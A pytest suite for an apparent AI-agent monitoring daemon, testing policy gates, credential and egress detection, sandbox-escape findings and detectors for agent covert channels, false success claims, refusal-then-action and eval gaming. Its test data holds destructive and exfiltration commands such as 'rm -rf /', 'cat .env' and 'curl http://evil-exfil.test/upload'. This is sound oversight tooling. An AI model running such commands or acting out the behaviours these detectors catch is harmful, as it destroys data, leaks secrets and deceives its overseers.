"""Tests for AgentTraceDaemon — session lifecycle, causal graph projection,
restart recovery, and pre-execution policy gating."""

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import uuid4

import pytest

from agenttrace.daemon import AgentTraceDaemon
from agenttrace.models.events import (
    CommandEvent,
    ConfidenceLevel,
    FileMutationEvent,
    InvocationEvent,
    NetworkEvent,
    ProcessEvent,
    ToolRequestEvent,
    ToolResultEvent,
)
from agenttrace.models.session import AgentType, SessionStatus


@pytest.mark.asyncio
async def test_daemon_session_lifecycle(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()

    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Audit test session",
        agent_type=AgentType.GENERIC,
    )

    assert session.status == SessionStatus.ACTIVE
    assert session.session_id in daemon._sessions

    # Ingest invocation
    inv_event = InvocationEvent(
        session_id=session.session_id,
        actor_id="user_prompt",
        source_adapter="sdk",
        user_intent="Refactor authentication",
    )
    await daemon.ingest_event(inv_event)

    # Ingest tool request & execution
    tool_event = ToolRequestEvent(
        session_id=session.session_id,
        actor_id="user_prompt",
        source_adapter="codex",
        tool_name="modify_file",
        tool_args={"path": "src/auth.py"},
    )
    await daemon.ingest_event(tool_event)

    file_event = FileMutationEvent(
        session_id=session.session_id,
        actor_id="filesystem",
        source_adapter="filesystem_observer",
        file_path="src/auth.py",
        mutation_type="modify",
    )
    await daemon.ingest_event(file_event)

    # Check graph causal edge correlation
    graph = daemon.get_graph(session.session_id)
    assert graph is not None
    assert graph.node_count >= 3

    await daemon.stop_session(session.session_id)
    await daemon.stop()


@pytest.mark.asyncio
async def test_daemon_restart_recovery(tmp_path: Path) -> None:
    data_dir = tmp_path / ".agenttrace"
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()

    session = await daemon1.create_session(
        workspace_path=str(tmp_path),
        task_description="Persistent audit task",
        agent_type=AgentType.GENERIC,
    )

    cmd_event = CommandEvent(
        session_id=session.session_id,
        actor_id="agent",
        source_adapter="terminal",
        command="pytest tests/",
    )
    await daemon1.ingest_event(cmd_event)
    await daemon1.stop()

    # Re-instantiate daemon from same directory
    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()

    # Verify session and graph were restored from SQLite
    restored_session = daemon2.get_session(session.session_id)
    assert restored_session is not None
    assert restored_session.task_description == "Persistent audit task"

    timeline = daemon2.get_timeline(session.session_id)
    assert len(timeline) >= 1

    # Verify chain validity on restored ledger
    is_valid, error = daemon2._ledger.verify_chain(session.session_id)
    assert is_valid, f"Chain should remain valid across restart: {error}"

    await daemon2.stop()


@pytest.mark.asyncio
async def test_daemon_pre_execution_policy_evaluation(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    sid = uuid4()

    # Test scope boundary rule
    allowed, reason, req_app = await daemon.evaluate_proposed_action(
        session_id=sid,
        action_type="command",
        target="rm -rf /",
    )
    # Default without session allows unless policy blocked
    assert isinstance(allowed, bool)


@pytest.mark.asyncio
async def test_pre_execution_gate_pause_and_approve(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Audit gate test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    # Destructive command → PAUSE (approval required), not a hard block
    allowed, reason, req_id = await daemon.evaluate_proposed_action(
        sid, "command", "rm -rf /tmp/scratch"
    )
    assert allowed is False
    assert reason.startswith("APPROVAL REQUIRED:")
    assert req_id == "destructive_operation"

    # Privilege escalation → hard BLOCK (approval cannot override)
    allowed2, reason2, req_id2 = await daemon.evaluate_proposed_action(
        sid, "command", "sudo rm -rf /tmp/scratch"
    )
    assert allowed2 is False
    assert reason2.startswith("BLOCKED:")
    assert req_id2 == ""

    # Approve the destructive scope, then the same gate must pass
    mgr = daemon.get_approval_manager(sid)
    assert mgr is not None
    mgr.record_approval(
        finding_id="destructive_operation",
        approved=True,
        reason="scratch dir is disposable",
        affected_commands=["rm -rf /tmp/scratch"],
    )
    allowed3, _, _ = await daemon.evaluate_proposed_action(sid, "command", "rm -rf /tmp/scratch")
    assert allowed3 is True

    await daemon.stop()


@pytest.mark.asyncio
async def test_gate_file_mutation_outside_scope(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Gate file test",
        agent_type=AgentType.GENERIC,
        allowed_paths=["src/**"],
        prohibited_paths=["secret/**"],
    )
    sid = session.session_id

    allowed, reason, req_id = await daemon.evaluate_proposed_action(
        sid, "file_mutation", "secret/keys.pem", {"mutation_type": "modify"}
    )
    assert allowed is False
    assert reason.startswith("APPROVAL REQUIRED:")
    assert req_id == "file_outside_scope"

    await daemon.stop()


@pytest.mark.asyncio
async def test_credential_content_check_wired(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Credential test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    cmd = CommandEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="terminal",
        command="export DB_PASSWORD=supersecretvalue123",
    )
    await daemon.ingest_event(cmd)

    findings = daemon.get_findings(sid)
    credential_findings = [
        f for f in findings
        if getattr(f, "finding_type", "") == "credential_access"
    ]
    assert credential_findings, "credential_access finding should be produced from command content"

    await daemon.stop()


@pytest.mark.asyncio
async def test_approvals_survive_restart(tmp_path: Path) -> None:
    data_dir = tmp_path / ".agenttrace"
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(tmp_path),
        task_description="Approval restart test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id
    mgr = daemon1.get_approval_manager(sid)
    assert mgr is not None
    mgr.record_approval(
        finding_id="destructive_operation",
        approved=True,
        reason="known disposable scratch dir",
        affected_commands=["rm -rf /tmp/scratch"],
    )
    await daemon1.stop()

    # Restart daemon over the same data dir — approvals must be restored
    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    mgr2 = daemon2.get_approval_manager(sid)
    assert mgr2 is not None
    allowed, _, _ = await daemon2.evaluate_proposed_action(sid, "command", "rm -rf /tmp/scratch")
    assert allowed is True
    await daemon2.stop()


@pytest.mark.asyncio
async def test_incident_correlation_wired(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Incident test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    # Credential-bearing command → credential finding
    cmd = CommandEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="terminal",
        command="export DB_PASSWORD=supersecretvalue123",
    )
    await daemon.ingest_event(cmd)

    # State-changing request to a public host shortly after
    net = NetworkEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="network_observer",
        destination_ip="8.8.8.8",
        destination_port=443,
        protocol="tcp",
        http_method="POST",
    )
    await daemon.ingest_event(net)

    incidents = daemon.get_incidents(sid)
    incident_types = {getattr(i, "incident_type", "") for i in incidents}
    assert {"credential_exfiltration", "external_state_change"} & incident_types, (
        f"expected a correlated incident, got {incident_types}"
    )

    await daemon.stop()


@pytest.mark.asyncio
async def test_gate_parses_ipv6_targets(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    sid = uuid4()

    assert daemon._split_host_port("[2001:db8::1]:443") == ("2001:db8::1", 443)
    assert daemon._split_host_port("8.8.8.8:53") == ("8.8.8.8", 53)
    assert daemon._split_host_port("2001:db8::1") == ("2001:db8::1", 0)
    assert daemon._split_host_port("8.8.8.8") == ("8.8.8.8", 0)
    assert daemon._split_host_port("") == ("0.0.0.0", 0)

    synthetic = daemon._synthetic_event_for_gate(
        "network",
        "[2001:db8::1]:8443",
        {"protocol": "tcp", "http_method": "POST"},
    )
    assert isinstance(synthetic, NetworkEvent)
    assert synthetic.destination_ip == "2001:db8::1"
    assert synthetic.destination_port == 8443
    assert synthetic.http_method == "POST"
    assert sid != synthetic.session_id  # throwaway event for evaluation


@pytest.mark.asyncio
async def test_gate_network_proposal_fires_external_state_change(
    tmp_path: Path,
) -> None:
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Gate network proposal test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    # A proposed state-changing request to a public host — recorded by the
    # gate (the observer layer can never see http_method), which lets the
    # incident engine detect it.
    allowed, reason, _ = await daemon.evaluate_proposed_action(
        sid,
        "network",
        "8.8.8.8:443",
        {"protocol": "tcp", "http_method": "POST"},
    )
    assert isinstance(allowed, bool)

    incidents = daemon.get_incidents(sid)
    incident_types = {getattr(i, "incident_type", "") for i in incidents}
    assert "external_state_change" in incident_types, (
        f"network proposal must fire external_state_change, got {incident_types}"
    )

    # The proposal event itself is in the graph, marked as a proposal
    graph = daemon._graphs[sid]
    proposal_nodes = [
        n for n in graph.to_snapshot().nodes
        if n.data.get("payload", {}).get("gate_proposal")
    ]
    assert len(proposal_nodes) == 1

    await daemon.stop()


@pytest.mark.asyncio
async def test_restart_resumes_active_session_observation(tmp_path: Path) -> None:
    """A crash-left ACTIVE session must be observed again after restart."""
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Zombie resume test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id
    expected_observers = 7 if sys.platform.startswith("linux") else 6
    assert len(daemon1._observers[sid]) == expected_observers
    assert sid in daemon1._adapter_tasks

    # Simulate a crash: no stop_session, no cursor persistence — the session
    # stays ACTIVE in storage with nothing watching it.
    for task in daemon1._adapter_tasks.values():
        task.cancel()
    daemon1._ledger.close()

    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    try:
        restored = daemon2.get_session(sid)
        assert restored is not None
        assert restored.status == SessionStatus.ACTIVE

        # Observation is resumed: observers, adapter, and poll task are live.
        assert len(daemon2._observers[sid]) == expected_observers
        assert daemon2._adapters[sid] is not None
        assert sid in daemon2._adapter_tasks
        assert not daemon2._adapter_tasks[sid].done()
    finally:
        await daemon2.stop()


@pytest.mark.asyncio
async def test_adapter_cursor_persisted_and_restored(tmp_path: Path) -> None:
    """A clean stop persists the adapter cursor; a clean restart does not
    resume a STOPPED session but keeps the cursor for future resumes."""
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Cursor test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id
    await daemon1.stop()

    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    try:
        # Cursor was persisted at the clean stop.
        cursor = daemon2._ledger.get_adapter_cursor(sid)
        assert cursor is not None
        assert cursor["adapter_name"] == "universal_agent_sensor"

        # Stopped sessions are restored but not resumed.
        restored = daemon2.get_session(sid)
        assert restored is not None
        assert restored.status == SessionStatus.STOPPED
        assert sid not in daemon2._observers
        assert sid not in daemon2._adapters
        assert sid not in daemon2._adapter_tasks
    finally:
        await daemon2.stop()


@pytest.mark.asyncio
async def test_restart_skips_stopped_sessions(tmp_path: Path) -> None:
    data_dir = tmp_path / ".agenttrace"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(data_dir)
    await daemon1.start()
    session = await daemon1.create_session(
        workspace_path=str(workspace),
        task_description="Stopped restore test",
        agent_type=AgentType.GENERIC,
    )
    await daemon1.stop()

    daemon2 = AgentTraceDaemon(data_dir)
    await daemon2.start()
    try:
        assert daemon2.get_session(session.session_id) is not None
        assert daemon2._observers == {}
        assert daemon2._adapters == {}
    finally:
        await daemon2.stop()


@pytest.mark.asyncio
async def test_detector_engine_emits_findings_through_ingest(tmp_path: Path) -> None:
    """Threat detectors fire on ingest and persist PolicyFindingEvents."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    try:
        session = await daemon.create_session(
            workspace_path=str(tmp_path),
            task_description="Detector wiring test",
            agent_type=AgentType.GENERIC,
        )
        sid = session.session_id

        await daemon.ingest_event(
            CommandEvent(
                session_id=sid,
                actor_id="test",
                source_adapter="terminal",
                command="cat .env",
            )
        )
        await daemon.ingest_event(
            FileMutationEvent(
                session_id=sid,
                actor_id="filesystem",
                source_adapter="filesystem_observer",
                file_path="/etc/ld.so.preload",
                mutation_type="create",
            )
        )
        await daemon.ingest_event(
            CommandEvent(
                session_id=sid,
                actor_id="test",
                source_adapter="terminal",
                command="npm test",
            )
        )

        findings = daemon.get_findings(sid)
        finding_types = {getattr(f, "finding_type", "") for f in findings}
        assert "credential_read_heuristic" in finding_types
        assert "sandbox_escape" in finding_types

        # Findings carry evidence references to the triggering events.
        cred = next(
            f for f in findings if getattr(f, "finding_type", "") == "credential_read_heuristic"
        )
        assert cred.evidence_refs
    finally:
        await daemon.stop()


@pytest.mark.asyncio
async def test_blob_index_points_to_existing_file(tmp_path: Path) -> None:
    """The ledger blob index path must match the on-disk sharded layout."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    try:
        session = await daemon.create_session(
            workspace_path=str(tmp_path),
            task_description="Blob index test",
            agent_type=AgentType.GENERIC,
        )
        raw = b"terminal capture with secrets\x00\x01"
        await daemon.ingest_event(
            CommandEvent(
                session_id=session.session_id,
                actor_id="test",
                source_adapter="terminal",
                command="echo hello",
            ),
            raw_payload=raw,
        )

        conn = daemon._ledger._conn
        row = conn.execute("SELECT file_path FROM blobs").fetchone()
        assert row is not None
        indexed_path = Path(row[0])
        assert indexed_path.exists()
        assert indexed_path.parent.name == indexed_path.name[:2]
        assert len(indexed_path.name) == 64
        assert daemon._blob_store.retrieve_blob(indexed_path.name) == raw
    finally:
        await daemon.stop()


@pytest.mark.asyncio
async def test_approved_egress_joins_workspace_baseline(tmp_path: Path) -> None:
    """An approved egress destination is persisted per-workspace and no
    longer flagged as new after a daemon restart."""
    from agenttrace.models.events import ApprovalEvent

    workspace = tmp_path / "ws"
    workspace.mkdir()
    daemon1 = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon1.start()
    try:
        session = await daemon1.create_session(
            workspace_path=str(workspace),
            task_description="Egress baseline test",
            agent_type=AgentType.GENERIC,
        )
        sid = session.session_id

        net = NetworkEvent(
            session_id=sid,
            actor_id="agent",
            source_adapter="network_observer",
            destination_ip="203.0.113.99",
            destination_port=443,
            protocol="tcp",
            direction="outbound",
        )
        await daemon1.ingest_event(net)

        egress = next(
            f for f in daemon1.get_findings(sid)
            if getattr(f, "finding_type", "") == "network_egress"
        )
        assert egress.payload.get("destination") == "203.0.113.99:443"

        # Approve the finding → destination joins the workspace baseline.
        await daemon1.ingest_event(
            ApprovalEvent(
                session_id=sid,
                actor_id="user",
                source_adapter="cli",
                finding_id=str(egress.event_id),
                approved=True,
                reason="trusted endpoint",
                scope="network:203.0.113.99:443",
            )
        )
        assert "203.0.113.99:443" in daemon1._ledger.get_destination_baseline(
            str(workspace)
        )
    finally:
        await daemon1.stop()

    # Restart: the same destination is now baseline-known, not "new".
    daemon2 = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon2.start()
    try:
        session2 = await daemon2.create_session(
            workspace_path=str(workspace),
            task_description="Egress baseline test (restart)",
            agent_type=AgentType.GENERIC,
        )
        await daemon2.ingest_event(
            NetworkEvent(
                session_id=session2.session_id,
                actor_id="agent",
                source_adapter="network_observer",
                destination_ip="203.0.113.99",
                destination_port=443,
                protocol="tcp",
                direction="outbound",
            )
        )
        findings = daemon2.get_findings(session2.session_id)
        assert not any(
            getattr(f, "finding_type", "") == "network_egress" for f in findings
        )
    finally:
        await daemon2.stop()


@pytest.mark.asyncio
async def test_shared_artifact_edge_links_cross_actor_file_touches(
    tmp_path: Path,
) -> None:
    """A different actor touching the same file yields a SHARED_ARTIFACT edge."""
    from agenttrace.models.events import FileMutationEvent

    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    try:
        session = await daemon.create_session(
            workspace_path=str(tmp_path),
            task_description="Shared artifact edge test",
            agent_type=AgentType.GENERIC,
        )
        sid = session.session_id

        await daemon.project_event(
            FileMutationEvent(
                session_id=sid,
                actor_id="agentA",
                source_adapter="fs_observer",
                file_path=str(tmp_path / "shared.py"),
                mutation_type="modify",
            )
        )
        await daemon.project_event(
            FileMutationEvent(
                session_id=sid,
                actor_id="agentB",
                source_adapter="fs_observer",
                file_path=str(tmp_path / "shared.py"),
                mutation_type="modify",
            )
        )

        edges = daemon._ledger.get_graph_edges(sid, edge_type="SHARED_ARTIFACT")
        assert len(edges) == 1
        assert edges[0]["actor_id"] == "agentB"

        # Same actor again: the reverse direction (B → A) is a legitimate
        # distinct sharing relationship, and it is the only new one.
        await daemon.project_event(
            FileMutationEvent(
                session_id=sid,
                actor_id="agentB",
                source_adapter="fs_observer",
                file_path=str(tmp_path / "shared.py"),
                mutation_type="modify",
            )
        )
        edges = daemon._ledger.get_graph_edges(sid, edge_type="SHARED_ARTIFACT")
        assert len(edges) == 2
        # Each cross-actor touch links to the most recent other actor's node:
        # both edges originate from agentA's node, targeting distinct touches.
        assert len({e["source_node_id"] for e in edges}) == 1
        assert len({e["target_node_id"] for e in edges}) == 2
    finally:
        await daemon.stop()


@pytest.mark.asyncio
async def test_adapter_workspace_boundary_enforced(tmp_path: Path) -> None:
    """Adapter events anchoring outside the workspace are not ingested."""
    from agenttrace.models.events import ContextBoundaryEvent, ProcessEvent

    workspace = tmp_path / "ws"
    workspace.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    sibling = tmp_path / "ws2"
    sibling.mkdir()

    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    try:
        session = await daemon.create_session(
            workspace_path=str(workspace),
            task_description="Adapter boundary test",
            agent_type=AgentType.GENERIC,
        )
        sid = session.session_id
        adapter = daemon._select_adapter(session)

        # Anchors inside the workspace pass...
        assert daemon._event_in_workspace(
            sid, adapter, FileMutationEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                file_path=str(workspace / "src" / "app.py"),
                mutation_type="modify",
            )
        )
        assert daemon._event_in_workspace(
            sid, adapter, ProcessEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                pid=1,
                command="python main.py",
                working_dir=str(workspace),
            )
        )

        # ...and events with no path anchors are never rejected.
        assert daemon._event_in_workspace(
            sid, adapter, InvocationEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                user_intent="do something",
            )
        )

        # Absolute paths outside the workspace are rejected, including
        # segment-prefix siblings (C:\ws must not contain C:\ws2).
        assert not daemon._event_in_workspace(
            sid, adapter, FileMutationEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                file_path=str(outside / "secret.db"),
                mutation_type="modify",
            )
        )
        assert not daemon._event_in_workspace(
            sid, adapter, FileMutationEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                file_path=str(sibling / "app.py"),
                mutation_type="modify",
            )
        )
        assert not daemon._event_in_workspace(
            sid, adapter, ProcessEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                pid=2,
                command="curl evil.example",
                working_dir=str(outside),
            )
        )
        assert not daemon._event_in_workspace(
            sid, adapter, ContextBoundaryEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="codex",
                files_visible=[str(outside / "keys.pem")],
            )
        )

        # Unknown sessions never silently pass either.
        assert not daemon._event_in_workspace(
            uuid4(), adapter, FileMutationEvent(
                session_id=uuid4(),
                actor_id="agent",
                source_adapter="codex",
                file_path=str(workspace / "app.py"),
                mutation_type="modify",
            )
        )
    finally:
        await daemon.stop()


def test_path_within_is_segment_exact(tmp_path: Path) -> None:
    ws = tmp_path / "proj"
    ws.mkdir()
    assert AgentTraceDaemon._path_within(ws / "sub" / "file.py", ws)
    assert AgentTraceDaemon._path_within(ws, ws)
    assert not AgentTraceDaemon._path_within(tmp_path / "proj2", ws)
    assert not AgentTraceDaemon._path_within(tmp_path / "proj_extra", ws)


@pytest.mark.asyncio
async def test_process_spawns_edge_links_parent_to_child(tmp_path: Path) -> None:
    """Observed ppid chains become SPAWNS edges: the process tree is visible."""
    from agenttrace.models.events import ProcessEvent

    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    try:
        session = await daemon.create_session(
            workspace_path=str(tmp_path),
            task_description="Process tree topology test",
            agent_type=AgentType.GENERIC,
        )
        sid = session.session_id

        parent = ProcessEvent(
            session_id=sid,
            actor_id="agent:test_agent",
            source_adapter="process_tree_observer",
            pid=1000,
            ppid=900,
            command_line="agent-shell --workspace",
            payload={"contained_descendant": True},
        )
        child = ProcessEvent(
            session_id=sid,
            actor_id="tool:git",
            source_adapter="process_tree_observer",
            pid=1001,
            ppid=1000,
            command_line="git status",
            payload={"contained_descendant": True},
        )
        await daemon.project_event(parent)
        await daemon.project_event(child)

        edges = daemon._ledger.get_graph_edges(sid, edge_type="SPAWNS")
        assert len(edges) == 1
        # Edge direction: parent process -> child process.
        parent_node = next(
            n for n in daemon._ledger.get_graph_nodes(sid)
            if n.get("data", {}).get("pid") == 1000
        )
        child_node = next(
            n for n in daemon._ledger.get_graph_nodes(sid)
            if n.get("data", {}).get("pid") == 1001
        )
        assert edges[0]["source_node_id"] == parent_node["node_id"]
        assert edges[0]["target_node_id"] == child_node["node_id"]
        assert edges[0]["confidence"] == "high"
    finally:
        await daemon.stop()


# -- Sprint-1 fix: ingest-pipeline detector failures are isolated, not fatal -----


@pytest.mark.asyncio
async def test_detector_crash_is_isolated_and_disclosed(tmp_path: Path) -> None:
    """A raising ingest detector must not poison the pipeline: before the
    fix, one detector exception rolled the adapter batch back forever (or
    silently dropped observer events) because the 5b blocks had no
    exception isolation. The blind spot must surface as a ledger-backed
    degraded-coverage finding instead."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Isolation test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    def _boom(event: object) -> list[object]:
        raise RuntimeError("detector exploded")

    daemon._credential_loops.observe = _boom  # type: ignore[method-assign]

    # Ingest two events: the crashing engine is invoked for both, and
    # ingestion must continue both times.
    for i in range(2):
        await daemon.ingest_event(
            CommandEvent(
                session_id=sid,
                actor_id="agent",
                source_adapter="claude_code",
                command=f"echo {i}",
            )
        )

    findings = daemon._ledger.query_events(sid, event_type="policy_finding", limit=None)
    degraded = [f for f in findings if f.finding_type == "ingest_detector_error"]
    assert len(degraded) == 1  # cooldown-capped: one disclosure, not per-event spam
    assert "credential_loops" in degraded[0].description
    # The ledger kept appending through the crash.
    assert daemon._ledger.event_count() > 2

    await daemon.stop_session(sid)
    await daemon.stop()


@pytest.mark.asyncio
async def test_restore_without_task_contract_is_safe(tmp_path: Path) -> None:
    """A session with no stored contract must neither crash the restore loop
    (the contract variable used to be unbound) nor inherit the PREVIOUS
    restored session's contract scope (wrong allowed_paths in
    DetectionEngine — silent wrong-scoping)."""
    data_dir = tmp_path / ".agenttrace"
    data_dir.mkdir()
    from agenttrace.models.session import SessionConfig
    from agenttrace.security.encryption import EncryptionManager
    from agenttrace.storage.ledger import EventLedger

    # Same key dir the daemon will use, or its ledger cannot decrypt ours.
    ledger = EventLedger(
        data_dir / "ledger.db",
        encryption_mgr=EncryptionManager(data_dir / "keys"),
    )
    # Session WITH a contract, then a session WITHOUT one. The second must
    # not adopt the first session's allowed_paths.
    sid_contract = uuid4()
    ledger.create_session(
        sid_contract,
        SessionConfig(workspace_path=str(tmp_path / "ws-a")).model_dump_json(),
        "contract session",
        datetime(2026, 1, 1, tzinfo=timezone.utc).isoformat(),
    )
    ledger.store_task_contract(
        contract_id=uuid4(),
        session_id=sid_contract,
        goal="hardened build",
        allowed_paths=[str(tmp_path / "ws-a")],
        risk_level="high",
    )
    sid_bare = uuid4()
    ledger.create_session(
        sid_bare,
        SessionConfig(workspace_path=str(tmp_path / "ws-b")).model_dump_json(),
        "no contract session",
        datetime(2026, 1, 1, 0, 1, tzinfo=timezone.utc).isoformat(),
    )

    daemon = AgentTraceDaemon(data_dir)
    await daemon.start()

    assert sid_contract in daemon._sessions
    assert sid_bare in daemon._sessions
    # The bare session gets its own engines with EMPTY scope, never the
    # contract session's allowed_paths.
    bare_paths = list(daemon._detectors[sid_bare]._context.workspace_paths)
    assert bare_paths == []
    assert daemon._eval_detectors[sid_bare].safety_flavored is False
    # Sanity: the contract session DID restore its scope.
    assert daemon._detectors[sid_contract]._context.workspace_paths == [
        str(tmp_path / "ws-a")
    ]

    await daemon.stop()


# -- Sprint 2: agent-claim vs OS-ground-truth separation in the graph ------------


@pytest.mark.asyncio
async def test_graph_nodes_carry_evidence_class(tmp_path: Path) -> None:
    """The graph layer's answer to 'what did the agent SAY vs what did the
    MACHINE do': every event-derived node carries its chain-of-custody class
    (plan2 #4 machinery, applied to the causal graph)."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    session = await daemon.create_session(
        workspace_path=str(tmp_path),
        task_description="Evidence class test",
        agent_type=AgentType.GENERIC,
    )
    sid = session.session_id

    # Agent narration (adapter transcript claim)…
    await daemon.ingest_event(
        CommandEvent(
            session_id=sid,
            actor_id="agent",
            source_adapter="claude_code",
            command="pytest tests/",
        )
    )
    # …versus an OS sensor's own observation.
    await daemon.ingest_event(
        ProcessEvent(
            session_id=sid,
            actor_id="auditd:4242",
            source_adapter="auditd",
            confidence=ConfidenceLevel.LOW,
            pid=4242,
            command_line="/bin/pytest tests/",
        )
    )

    graph = daemon.get_graph(sid)
    assert graph is not None
    classes = {
        node.node_type.value: node.data.get("evidence_class")
        for node in graph.get_timeline()
    }
    assert classes["command"] == "agent_claimed"
    assert classes["process"] == "os_observed"

    await daemon.stop_session(sid)
    await daemon.stop()


# -- Sprint 3: pipeline wiring for every projection engine -----------------------
#
# Unit tests prove each detector works; these prove the daemon actually FEEDS
# it. If a 5b ingest block is deleted or miswired, the full unit suite stays
# green while the product goes blind — that regression class is what these
# tests close.


def _sid_events(ledger: object, sid: object, finding_type: str) -> list[object]:
    return [
        f for f in ledger.query_events(sid, event_type="incident", limit=None)
        if f.incident_type == finding_type
    ]


def _sid_findings(ledger: object, sid: object, finding_type: str) -> list[object]:
    return [
        f for f in ledger.query_events(sid, event_type="policy_finding", limit=None)
        if f.finding_type == finding_type
    ]


@pytest.mark.asyncio
async def test_pipeline_wiring_per_session_families(tmp_path: Path) -> None:
    """Covert channel (5b-2), evidence boundary (5b-3), hesitation (5b-6),
    and eval integrity (5b-7) must each emit through the live ingest
    pipeline — separate sessions so detector state cannot cross-talk."""
    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
    await daemon.start()
    now = datetime.now(timezone.utc)

    # 5b-2 covert channel: zz-marked mailbox parent at the default volume.
    s_covert = await daemon.create_session(
        workspace_path=str(tmp_path), task_description="covert", agent_type=AgentType.GENERIC,
    )
    names = ("alpha", "bravo", "charlie", "delta", "echo", "foxtrot",
             "golf", "hotel", "india", "juliet", "kilo", "lima")
    for i, name in enumerate(names):
        await daemon.ingest_event(FileMutationEvent(
            session_id=s_covert.session_id,
            actor_id="agent", source_adapter="filesystem_observer",
            file_path=str(tmp_path / "mail" / "zzMAILBOX_AIC71C" / name),
            mutation_type="create", size_delta=100 + i * 37,
            timestamp=now + timedelta(seconds=i),
        ))
    assert _sid_events(daemon._ledger, s_covert.session_id, "message_board_structure")
    await daemon.stop_session(s_covert.session_id)

    # 5b-3 evidence boundary: kernel exit contradicts a success claim.
    s_evidence = await daemon.create_session(
        workspace_path=str(tmp_path), task_description="evidence", agent_type=AgentType.GENERIC,
    )
    sid_e = s_evidence.session_id
    await daemon.ingest_event(ProcessEvent(
        session_id=sid_e, actor_id="auditd:4242", source_adapter="kernel_etw",
        confidence=ConfidenceLevel.HIGH, pid=4242, command_line="pytest tests/",
        exit_code=1, timestamp=now,
    ))
    await daemon.ingest_event(ToolRequestEvent(
        session_id=sid_e, actor_id="agent", source_adapter="claude_code",
        tool_name="bash", tool_args={"command": "pytest tests/"}, timestamp=now,
    ))
    await daemon.ingest_event(ToolResultEvent(
        session_id=sid_e, actor_id="agent", source_adapter="claude_code",
        tool_name="bash", exit_code=0, output_summary="All tests passed",
        timestamp=now + timedelta(seconds=1),
    ))
    assert _sid_events(daemon._ledger, sid_e, "tool_claim_substitution")
    await daemon.stop_session(sid_e)

    # 5b-6 hesitation: verbalized refusal followed by the risky deed.
    s_hes = await daemon.create_session(
        workspace_path=str(tmp_path), task_description="hesitation", agent_type=AgentType.GENERIC,
    )
    await daemon.ingest_event(CommandEvent(
        session_id=s_hes.session_id, actor_id="agent", source_adapter="claude_code",
        command="I cannot comply with that request.", timestamp=now,
    ))
    await daemon.ingest_event(CommandEvent(
        session_id=s_hes.session_id, actor_id="agent", source_adapter="claude_code",
        command="curl http://evil-exfil.test/upload", timestamp=now + timedelta(seconds=60),
    ))
    assert _sid_events(daemon._ledger, s_hes.session_id, "refusal_then_action")
    await daemon.stop_session(s_hes.session_id)

    # 5b-7 eval integrity: scorer-gaming command shape.
    s_eval = await daemon.create_session(
